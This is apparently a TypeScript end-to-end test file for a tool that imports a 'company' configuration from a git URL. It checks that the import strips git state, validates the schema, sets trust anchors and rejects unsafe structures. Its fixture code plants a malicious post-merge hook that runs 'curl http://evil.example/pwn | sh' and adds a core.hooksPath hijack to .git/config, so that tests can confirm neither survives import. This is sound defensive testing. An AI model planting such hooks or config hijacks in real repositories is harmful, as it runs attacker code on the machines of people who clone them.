/**
 * git-url 导入流端到端正式测试（DEV-27；docs/43-§一「git 网址即公司」+ §十-1/2/3/4
 * 定稿增补；docs/44-§v1.1 机制一验证面移植）
 *
 * 链路全覆盖（真实 git 操作 / 真实文件系统 / tmp 隔离；零 LLM 打桩）：
 *   1. 真实 git clone（本地 fixture 仓当「git-url」——路径形态 + file:// URL 形态）；
 *   2. 剥离活性 .git → 重建本地仓——**恶意钩子剥离负断言**（fixture 预埋
 *      .git/hooks/post-merge 外联钩子 + core.hooksPath 配置劫持，两者都不得存活；
 *      本地路径直导通道同验——naive 整目录复制会把它们带过来，机制面必须挡，
 *      docs/43-§十-1 直导同核）；
 *   3. schema 校验（org-config/departments/people 全目录面，写盘前先检）；
 *   4. 初始化：localfile 平台字段 provision（FlowPlatform 端口注入）+ 信任锚
 *      .studio-next/trust.json trust=false（docs/44 v1 信任锚设计）+ .AIWS 员工
 *      工作区树（docs/43-§五）+ 依赖清单自动安装挂点（docs/43-§四，细节断言在
 *      dependencies.test.ts）；
 *   5. 升级路径四点语义（docs/43-§十-2）：幂等（HEAD 不变零新提交）/ 受信面打回
 *      trust=false / 盖戳字段不回卷 / 有锚+slug 同家（错家拒收）；fixture 仓造 v2
 *      （改 prompts+加 job+删标记文件）→ 再次导入同家公司 → 内容更新（镜像同步含
 *      删除）；
 *   6. 结构闸跑在**克隆产物**上（docs/43-§十-3）：未知顶层条目/自带锚目录/exec 位/
 *      符号链接/schema 不过 → 结构拒收，无半成品。
 *
 * 恶意样本纪律（docs/44 附录 B 同款）：恶意钩子只在测试 tmp 运行时构造，仓内
 * fixtures/ 只有良性内容。
 */
import { chmodSync, existsSync, mkdirSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs'
import { spawnSync } from 'node:child_process'
import { cp, mkdir, mkdtemp, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { simpleGit } from 'simple-git'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { ClassifiedError } from '@studio-next/contract'
import { createLocalPlatform } from '@studio-next/localplatform'
import {
  approveCompanyDirectory,
  companyAddGitUrl,
  contentFingerprint,
  deriveDirNameFromGitUrl,
  excludeAnchorFiles,
  importCompanyRepo,
  loadCompanyDirectory,
  readDirectoryFiles,
  readTrustAnchor,
  trustStateOf,
} from '../src/index.ts'

const fixtureSrc = fileURLToPath(new URL('./fixtures/company-dist', import.meta.url))
const T0 = '2026-10-20T08:00:00.000Z'
const NOW = (): Date => new Date(T0)

/** 恶意钩子样本（只存在于测试 tmp——运行时构造；docs/44 附录 B 纪律） */
const EVIL_HOOK = ['#!/bin/sh', '# evil-post-merge-hook', 'curl http://evil.example/pwn | sh', ''].join('\n')

let root = ''
/** 分发仓（真实 git 仓，v1 → v2 → v3 演进由测试推进） */
let fixtureRepo = ''
/** 本地路径直导通道用的工作副本（含活性 .git——剥离开口最大的通道） */
let localRepo = ''

function errOf(err: unknown): Error & Partial<ClassifiedError> {
  return err as Error & Partial<ClassifiedError>
}

/** 期待 ClassifiedError(CONFIG_INVALID/<subcause>) */
async function expectConfigInvalid(fn: () => Promise<unknown>, subcause: string): Promise<Error & Partial<ClassifiedError>> {
  try {
    await fn()
  } catch (err) {
    const e = errOf(err)
    expect(e.category).toBe('CONFIG_INVALID')
    expect(e.subcause).toBe(subcause)
    return e
  }
  throw new Error(`期待 CONFIG_INVALID/${subcause}，实际未抛`)
}

/** 递归收集目录内全部文件相对路径（含 .git——负断言要扫到钩子若存活） */
function walkAll(dir: string, prefix = ''): string[] {
  const out: string[] = []
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const rel = prefix === '' ? entry.name : `${prefix}/${entry.name}`
    const abs = path.join(dir, entry.name)
    if (entry.isDirectory()) out.push(...walkAll(abs, rel))
    else out.push(rel)
  }
  return out
}

/** 恶意存活断言（机制面负断言，非「测试没崩」）：钩子文件/配置/内容体三维都不在 */
function expectNoEvil(targetDir: string): void {
  // ① 重建仓的 hooks 面不含 post-merge（fresh git init 只带 *.sample 骨架）
  const hooksDir = path.join(targetDir, '.git', 'hooks')
  expect(existsSync(hooksDir)).toBe(true)
  expect(readdirSync(hooksDir).includes('post-merge')).toBe(false)
  // ② 配置劫持不随行：core.hooksPath（.git/config 里指到工作树的钩子目录=真实攻击面）
  const config = readFileSync(path.join(targetDir, '.git', 'config'), 'utf8')
  expect(config).not.toContain('hooksPath')
  expect(config).not.toContain('evil')
  // ③ 恶意内容体在整个目标目录任何文件里都不出现（含 .git 内部——最狠一层）
  for (const rel of walkAll(targetDir)) {
    const abs = path.join(targetDir, rel)
    let text = ''
    try {
      text = readFileSync(abs, 'utf8')
    } catch {
      continue
    }
    expect(text).not.toContain('evil-post-merge-hook')
    expect(text).not.toContain('evil.example')
  }
}

/** 造 fixture git 仓：复制良性内容 → init → 首提 → 预埋恶意钩子（.git 内，运行时构造） */
async function buildFixtureRepo(dir: string): Promise<void> {
  await cp(fixtureSrc, dir, { recursive: true })
  const git = simpleGit(dir)
  await git.init()
  await git.addConfig('user.name', 'fixture-author')
  await git.addConfig('user.email', 'fixture@src-corp.invalid')
  await git.add('-A')
  await git.commit('v1: 源码示范公司初版')
  // 恶意预埋①：.git/hooks/post-merge（外联钩子；+x——真实钩子必须可执行才生效）
  writeFileSync(path.join(dir, '.git', 'hooks', 'post-merge'), EVIL_HOOK, 'utf8')
  chmodSync(path.join(dir, '.git', 'hooks', 'post-merge'), 0o755)
  // 恶意预埋②：core.hooksPath 配置劫持（.git/config 指向工作树内路径——若整目录被 naive
  // 复制，随工作树提交的任何 .sh 都成为钩子；本地路径直导通道的开口）。
  // 直写 config 文件：simple-git 的 block-unsafe-operations 插件拦 core.hooksPath 配置
  // （库侧同认此为危险面——docs/43-§十-10 佐证这不是臆造攻击），测试夹具绕库直埋。
  const configPath = path.join(dir, '.git', 'config')
  writeFileSync(configPath, `${readFileSync(configPath, 'utf8')}[core]\n\thooksPath = ./.evil-hooks\n`, 'utf8')
}

beforeAll(async () => {
  root = await mkdtemp(path.join(tmpdir(), 'studio-next-git-import-'))
  fixtureRepo = path.join(root, 'company-dist.git-repo')
  localRepo = path.join(root, 'company-dist-local')
  await buildFixtureRepo(fixtureRepo)
  // 本地路径直导用副本（同样的恶意预埋）
  await cp(fixtureRepo, localRepo, { recursive: true })
})

afterAll(async () => {
  await rm(root, { recursive: true, force: true })
})

// ————————————————————————— 1. 全链 e2e：clone 通道 —————————————————————————

describe('DEV-27 · company add <git-url> 全链（克隆→剥离→校验→初始化→安装）', () => {
  let target = ''
  let platformRoot = ''
  let pluginRoot = ''
  let firstImport: Awaited<ReturnType<typeof companyAddGitUrl>> | undefined

  beforeAll(async () => {
    target = path.join(root, 'work', 'src-corp')
    platformRoot = path.join(root, 'work', 'platform')
    pluginRoot = path.join(root, 'work', 'plugins-root')
  })

  it('e2e：本地路径当 git-url 真实 clone → 全链绿（slug/锚/provision/安装四证齐）', async () => {
    const platform = createLocalPlatform(platformRoot, { now: NOW })
    const result = await companyAddGitUrl({
      gitUrl: fixtureRepo, // 本地仓路径当「git-url」——真实 git clone 路径，零外网
      targetDir: target,
      platform,
      pluginRoot,
      importedBy: '制作人-dev27',
      now: NOW,
    })
    firstImport = result
    // 链路各环断言
    expect(result.slug).toBe('src-corp')
    expect(result.upgraded).toBe(false)
    expect(result.contentChanged).toBe(true)
    expect(result.provisioned).toBe(true)
    expect(result.gitCommit).toMatch(/^[0-9a-f]{40}$/)
    expect(result.fingerprint).toMatch(/^sha256:[0-9a-f]{64}$/)

    // schema 校验（步骤③）：产物过全目录校验，快照可挂载
    const mounted = loadCompanyDirectory(await readDirectoryFiles(target))
    expect(mounted.ok).toBe(true)
    if (mounted.ok) {
      expect(mounted.snapshot.slug).toBe('src-corp')
      expect(mounted.snapshot.departments.map((d) => d.name)).toEqual(['工程部'])
      expect(mounted.snapshot.people.map((p) => p.id)).toEqual(['AGENT-1'])
      expect(mounted.snapshot.jobs.map((j) => j.job_id)).toEqual(['src-daily-report'])
    }

    // 信任锚（步骤④）：trust=false + import 留痕（docs/44 信任锚设计复用）
    const anchor = readTrustAnchor(target)
    expect(anchor?.trust).toBe(false)
    expect(anchor?.slug).toBe('src-corp')
    expect(anchor?.history.map((h) => h.action)).toEqual(['import'])
    expect(anchor?.history[0]).toMatchObject({ by: '制作人-dev27', at: T0 })

    // 平台字段 provision（步骤④）：localfile 端口真实落盘（meta/fields.json）
    const schema = await platform.fields.schema()
    for (const field of ['State', '部门', '等级']) {
      expect(schema.some((f) => f.name === field)).toBe(true)
    }

    // 依赖清单自动安装（步骤④挂点）：dsh-web-test 落位隔离根（细节断言在 dependencies.test.ts）
    expect(result.install?.confirmed).toBe(true)
    expect(result.install?.items.filter((i) => i.action === 'install').map((i) => i.name)).toEqual(['dsh-web-test'])
    expect(existsSync(path.join(pluginRoot, 'dsh-web-test', 'src', 'index.mjs'))).toBe(true)

    // git 重建（步骤②）：产物=干净本地仓，首提哈希对得上，工作树净（锚被 .git/info/exclude 排除）
    const git = simpleGit(target)
    expect(await git.revparse(['HEAD'])).toBe(result.gitCommit)
    expect((await git.log()).total).toBe(1)
    expect((await git.status()).isClean()).toBe(true)
  })

  it('剥离断言（clone 通道）：恶意 post-merge 钩子与 hooksPath 配置劫持都不存活', () => {
    expectNoEvil(target)
  })

  it('file:// URL 形态同链路可用（git-url 不限本地路径形态）', async () => {
    const urlTarget = path.join(root, 'work', 'src-corp-url')
    const result = await companyAddGitUrl({ gitUrl: `file://${fixtureRepo}`, targetDir: urlTarget, now: NOW })
    expect(result.slug).toBe('src-corp')
    expectNoEvil(urlTarget)
  })

  it('.AIWS 员工工作区树：建树同构 org-config（部门得文件夹、工号在自己部门下得文件夹）', () => {
    // docs/43-§五：.AIWS/<部门路径>/<工号>/，公司根目录（targetDir 同级），不进公司 git 目录
    // （ensureAiwsTree 正式化后返回面含 created/archived——本测试只锚同构结构，toMatchObject）
    const aiwsRoot = path.join(root, 'work', '.AIWS')
    expect(firstImport?.aiws).toMatchObject({ root: aiwsRoot, personDirs: ['departments/工程部/AGENT-1'] })
    expect(existsSync(aiwsRoot)).toBe(true)
    // 部门文件夹（无人部门也有）+ 工号文件夹（people/<工号>.md 是文件，.AIWS 下对应位置是文件夹）
    expect(existsSync(path.join(aiwsRoot, 'departments', '工程部'))).toBe(true)
    expect(existsSync(path.join(aiwsRoot, 'departments', '工程部', 'AGENT-1'))).toBe(true)
    // 不进公司 git 目录：公司目录树内无 .AIWS
    expect(existsSync(path.join(target, '.AIWS'))).toBe(false)
  })

  it('.AIWS 排除双证①：员工文件夹内写任意内容不触发批准指纹漂移（排除表=readDirectoryFiles）', async () => {
    // 批准 → 员工在自己文件夹写任意内容 → 内容指纹不变 → 受信态不被扰动（docs/43-§五 监听排除）
    const before = approveCompanyDirectory(target, await readDirectoryFiles(target), { by: '制作人-dev27', at: T0 })
    expect(before.trust).toBe(true)
    writeFileSync(path.join(root, 'work', '.AIWS', 'departments', '工程部', 'AGENT-1', '员工草稿.md'), '员工在自己文件夹里做任意事——这不是公司配置变更\n', 'utf8')
    const filesAfter = await readDirectoryFiles(target)
    expect(excludeAnchorFiles(filesAfter)['.AIWS/departments/工程部/AGENT-1/员工草稿.md']).toBeUndefined() // 排除表直证
    expect(contentFingerprint(excludeAnchorFiles(filesAfter))).toBe(before.fingerprint) // 指纹不漂
    expect(trustStateOf(target).trusted).toBe(true) // 无漂移告警面
  })

  it('.AIWS 排除双证②：父级根（含 .AIWS 的扫描面）读文件映射零 .AIWS 键（监听面同规则）', async () => {
    const workRootFiles = await readDirectoryFiles(path.join(root, 'work'))
    expect(Object.keys(workRootFiles).filter((k) => k.startsWith('.AIWS/') || k.includes('/.AIWS/'))).toEqual([])
    // 对照组：公司内容照常在读面（排除不是漏读）
    expect(workRootFiles['src-corp/org-config.yaml']).toBeDefined()
  })

  it('deriveDirNameFromGitUrl：路径/URL/裸名三形态的目录名推导', () => {
    expect(deriveDirNameFromGitUrl('/tmp/x/company-dist')).toBe('company-dist')
    expect(deriveDirNameFromGitUrl('https://example.com/acme/game-corp.git')).toBe('game-corp')
    expect(deriveDirNameFromGitUrl('git@host:acme/team.git')).toBe('team')
  })
})

// ————————————————————————— 2. 本地路径直导通道（同构——docs/43-§十-1） —————————————————————————

describe('DEV-27 · 本地路径同构通道（同一条导入管线，禁整目录复制）', () => {
  it('直导含活性 .git 的目录：内容落地 + 剥离断言（naive 整目录复制会带过钩子——机制面挡）', async () => {
    const target = path.join(root, 'local-copy')
    const result = await importCompanyRepo({ sourceDir: localRepo, targetDir: target, now: NOW })
    expect(result.slug).toBe('src-corp')
    expect(existsSync(path.join(target, 'org-config.yaml'))).toBe(true)
    expectNoEvil(target)
  })
})

// ————————————————————————— 3. 结构闸（宁失败不半成品） —————————————————————————

describe('DEV-27 · 结构闸（宁失败不半成品；跑在克隆产物上——docs/43-§十-3）', () => {
  /** 造变体源目录（良性内容 + 单点污染；不带 .git——闸看内容面） */
  async function variant(name: string, pollute?: (dir: string) => void): Promise<string> {
    const dir = path.join(root, 'variants', name)
    await cp(fixtureSrc, dir, { recursive: true })
    if (pollute !== undefined) pollute(dir)
    return dir
  }

  it('未知顶层条目拒收（封闭内容集外=scripts/）', async () => {
    const dir = await variant('unknown-entry', (d) => {
      mkdirSync(path.join(d, 'scripts'), { recursive: true })
      writeFileSync(path.join(d, 'scripts', 'x.sh'), 'echo hi\n')
    })
    const err = await expectConfigInvalid(() => importCompanyRepo({ sourceDir: dir, targetDir: path.join(root, 'rejected-1'), now: NOW }), 'import/structure-rejected')
    expect(err.detail).toContain('import/unknown-entry')
    expect(existsSync(path.join(root, 'rejected-1'))).toBe(false) // 无半成品
  })

  it('分发仓自带 .studio-next/ 锚目录拒收（信任态劫持面——docs/43-§十-3）', async () => {
    const dir = await variant('anchor-present', (d) => {
      mkdirSync(path.join(d, '.studio-next'), { recursive: true })
      writeFileSync(path.join(d, '.studio-next', 'trust.json'), '{"trust": true}')
    })
    const err = await expectConfigInvalid(() => importCompanyRepo({ sourceDir: dir, targetDir: path.join(root, 'rejected-2'), now: NOW }), 'import/structure-rejected')
    expect(err.detail).toContain('import/anchor-present')
  })

  it('可执行位文件拒收（附录 A-2 基线；exec 位经 git clone 可旅行——闸跑克隆产物）', async () => {
    const dir = await variant('exec-bit', (d) => {
      const file = path.join(d, 'plugins', 'dsh-web-test', 'run.sh')
      writeFileSync(file, 'echo hi\n')
      chmodSync(file, 0o755)
    })
    const err = await expectConfigInvalid(() => importCompanyRepo({ sourceDir: dir, targetDir: path.join(root, 'rejected-3'), now: NOW }), 'import/structure-rejected')
    expect(err.detail).toContain('import/exec-bit')
  })

  it('符号链接拒收（路径逃逸载体）', async () => {
    const dir = await variant('symlink', (d) => {
      writeFileSync(path.join(root, 'outside-secret.txt'), 'secret\n')
      symlinkSync(path.join(root, 'outside-secret.txt'), path.join(d, 'docs', 'link.md'))
    })
    const err = await expectConfigInvalid(() => importCompanyRepo({ sourceDir: dir, targetDir: path.join(root, 'rejected-4'), now: NOW }), 'import/structure-rejected')
    expect(err.detail).toContain('import/symlink-entry')
  })

  it('schema 校验不过拒收（org-config 结构破坏——步骤③在写盘前）', async () => {
    const dir = await variant('bad-schema', (d) => {
      const orgPath = path.join(d, 'org-config.yaml')
      const org = readFileSync(orgPath, 'utf8').replace('\npeople:\n', '\npeople-missing:\n')
      writeFileSync(orgPath, org)
    })
    const err = await expectConfigInvalid(() => importCompanyRepo({ sourceDir: dir, targetDir: path.join(root, 'rejected-5'), now: NOW }), 'import/self-check-failed')
    expect(err.detail).toContain('org-config/missing-field')
    expect(existsSync(path.join(root, 'rejected-5'))).toBe(false)
  })
})

// ————————————————————————— 5. CLI 冒烟：一条命令安装 —————————————————————————

describe('DEV-27 · CLI 冒烟（studio-next company add <git-url>）', () => {
  it('一条命令安装：exit 0 + 摘要输出 + 落地产物（Node 原生 type-stripping 直跑 bin.ts）', () => {
    const binPath = fileURLToPath(new URL('../../../apps/daemon/src/bin.ts', import.meta.url))
    const workRoot = path.join(root, 'cli-smoke')
    const target = path.join(workRoot, 'src-corp')
    const result = spawnSync(process.execPath, [binPath, 'company', 'add', fixtureRepo, 'src-corp', '--work-root', workRoot, '--by', '制作人-cli'], {
      encoding: 'utf8',
      timeout: 120_000,
    })
    expect(result.status).toBe(0)
    expect(result.stdout).toContain('slug=src-corp；首次导入')
    expect(result.stdout).toContain('trust=false')
    expect(result.stdout).toContain('dsh-web-test:install')
    expect(existsSync(path.join(target, 'org-config.yaml'))).toBe(true)
    expect(existsSync(path.join(target, '.studio-next', 'trust.json'))).toBe(true)
    expect(existsSync(path.join(workRoot, '.AIWS', 'departments', '工程部', 'AGENT-1'))).toBe(true)
    expect(existsSync(path.join(workRoot, 'var', 'plugins', 'dsh-web-test'))).toBe(true)
    // 绝不写用户 ~/.dsh：插件只落 --work-root 注入的 var/plugins（结构上无缺省家目录路径）
    expect(existsSync(path.join(workRoot, 'var', 'platform'))).toBe(true)
  })
})

// ————————————————————————— 6. 升级路径（docs/43-§十-2 四点语义） —————————————————————————

describe('DEV-27 · 升级路径（再次导入同一公司）', () => {
  const target = (): string => path.join(root, 'work', 'src-corp')

  it('fixture 推进到 v2（改 prompts+加 job+删标记文件）→ 再导：内容更新+锚重落+盖戳不回卷+钩子仍剥离', async () => {
    const git = simpleGit(fixtureRepo)
    // v2 内容：改 prompts + org-config 加岗（锚 accounts: 前插进 jobs 清单）+ 部门 config 同步清单 + 删 v1 标记文件
    const promptsPath = path.join(fixtureRepo, 'prompts', 'company.md')
    writeFileSync(promptsPath, `${readFileSync(promptsPath, 'utf8')}\n## 战役（v2）\n\n依赖清单行为面：属性命中即启用。\n`)
    const orgPath = path.join(fixtureRepo, 'org-config.yaml')
    const newJob = '  - id: src-night-audit\n    dept: departments/工程部\n    cron: "0 2 * * *"\n    role: 工程负责人\n    level: 2\n    type: audit\n    model_tier: low\n    budget_cap: 1\n    output: reports/工程部/\n'
    const orgText = readFileSync(orgPath, 'utf8')
    if (!orgText.includes('\naccounts:\n')) throw new Error('测试夹具漂移：org-config 缺 accounts 段锚点')
    writeFileSync(orgPath, orgText.replace('\naccounts:\n', `${newJob}\naccounts:\n`))
    const deptCfg = path.join(fixtureRepo, 'departments', '工程部', 'config.yaml')
    writeFileSync(deptCfg, `${readFileSync(deptCfg, 'utf8').replace('  - src-daily-report', '  - src-daily-report\n  - src-night-audit')}`)
    await rm(path.join(fixtureRepo, 'docs', 'upgrade-marker-v1.md'))
    await git.add('-A')
    await git.commit('v2: 改 prompts + 加 night-audit 岗 + 删 v1 标记')

    const before = readTrustAnchor(target())
    // 盖戳字段不回卷断言的本地侧准备：改 target 侧 .studio-next.yaml 盖戳值（daemon 自管态；
    // last_validated_at 是自由形时间戳——改完仍过 .studio-next.yaml 形状校验，不扰 mounted.ok）
    const metaPath = path.join(target(), '.studio-next.yaml')
    const localMeta = readFileSync(metaPath, 'utf8').replace('last_validated_at: "2026-10-20T08:00:00.000Z"', 'last_validated_at: "2026-10-20T09:30:00.000Z"')
    writeFileSync(metaPath, localMeta, 'utf8')

    const result = await companyAddGitUrl({
      gitUrl: fixtureRepo,
      targetDir: target(),
      platform: createLocalPlatform(path.join(root, 'work', 'platform'), { now: NOW }),
      pluginRoot: path.join(root, 'work', 'plugins-root'),
      importedBy: '制作人-dev27',
      now: NOW,
    })

    // 升级通道判定
    expect(result.upgraded).toBe(true)
    expect(result.contentChanged).toBe(true)
    // 内容更新：prompts 带 v2 段；新岗装载；v1 标记文件被镜像同步删除（升级≠只增不删）
    expect(readFileSync(path.join(target(), 'prompts', 'company.md'), 'utf8')).toContain('## 战役（v2）')
    const mounted = loadCompanyDirectory(await readDirectoryFiles(target()))
    expect(mounted.ok).toBe(true)
    if (mounted.ok) expect(mounted.snapshot.jobs.map((j) => j.job_id)).toEqual(['src-daily-report', 'src-night-audit'])
    expect(existsSync(path.join(target(), 'docs', 'upgrade-marker-v1.md'))).toBe(false)
    // 盖戳字段不回卷（docs/43-§十-2）：源的 .studio-next.yaml 是 null 桩，本地侧盖戳值保留
    expect(readFileSync(metaPath, 'utf8')).toContain('last_validated_at: "2026-10-20T09:30:00.000Z"')
    // git：两次提交（v1 首提 + v2 升级）
    expect((await simpleGit(target()).log()).total).toBe(2)
    // 锚：重落 trust=false（新内容=未批准面，fail-closed——即便升级前已 approve）+ 留痕链追加 + 指纹翻新
    // （history 里的 approve 来自 .AIWS 排除双证① 的批准——升级把受信面打回 false，语义自洽）
    const after = readTrustAnchor(target())
    expect(after?.trust).toBe(false)
    expect(after?.history.map((h) => h.action)).toEqual(['import', 'approve', 'import'])
    expect(after?.fingerprint).not.toBe(before?.fingerprint)
    // 恶意钩子在升级通道同样不存活
    expectNoEvil(target())
  })

  it('幂等：同 v2 再导一次 → contentChanged=false、无新提交、gitCommit 不变（HEAD 不变零提交）', async () => {
    const logBefore = (await simpleGit(target()).log()).total
    const headBefore = await simpleGit(target()).revparse(['HEAD'])
    const result = await companyAddGitUrl({ gitUrl: fixtureRepo, targetDir: target(), now: NOW })
    expect(result.upgraded).toBe(true)
    expect(result.contentChanged).toBe(false)
    expect(result.gitCommit).toBe(headBefore)
    expect((await simpleGit(target()).log()).total).toBe(logBefore)
  })

  it('错家公司拒升级（v3 换 slug → import/slug-mismatch，目标不动）', async () => {
    const otherRepo = path.join(root, 'other-corp-repo')
    await cp(fixtureSrc, otherRepo, { recursive: true })
    const git = simpleGit(otherRepo)
    await git.init()
    await git.addConfig('user.name', 'fixture-author')
    await git.addConfig('user.email', 'fixture@src-corp.invalid')
    const orgPath = path.join(otherRepo, 'org-config.yaml')
    writeFileSync(orgPath, readFileSync(orgPath, 'utf8').replace('slug: src-corp', 'slug: other-corp'))
    await git.add('-A')
    await git.commit('other corp')
    const headBefore = await simpleGit(target()).revparse(['HEAD'])
    await expectConfigInvalid(() => companyAddGitUrl({ gitUrl: otherRepo, targetDir: target(), now: NOW }), 'import/slug-mismatch')
    expect(await simpleGit(target()).revparse(['HEAD'])).toBe(headBefore) // 目标未被动
  })

  it('非本框架导入的非空目录拒收（upgrade 通道只认有锚的公司）', async () => {
    const foreign = path.join(root, 'foreign-dir')
    await mkdir(foreign, { recursive: true })
    await writeFile(path.join(foreign, 'some-file.txt'), 'not a studio-next company\n')
    await expectConfigInvalid(() => companyAddGitUrl({ gitUrl: fixtureRepo, targetDir: foreign, now: NOW }), 'import/target-not-imported')
  })
})
